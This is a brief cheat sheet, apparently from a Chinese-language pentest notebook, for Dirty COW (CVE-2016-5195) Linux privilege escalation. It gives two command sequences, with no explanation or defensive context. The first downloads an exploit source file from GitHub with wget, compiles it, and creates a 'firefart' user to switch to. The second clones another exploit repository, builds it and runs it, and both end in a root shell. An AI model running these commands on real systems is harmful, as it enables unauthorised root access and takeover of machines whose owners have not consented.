# 脏牛提权



### exp1

```bash
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <password>
su firefart 
# getrootshell
```

### exp2

```bash
git clone https://github.com/gbonacini/CVE-2016-5195.git
cd CVE-2016-5195
make
./dcow -s
# getrootshell
```

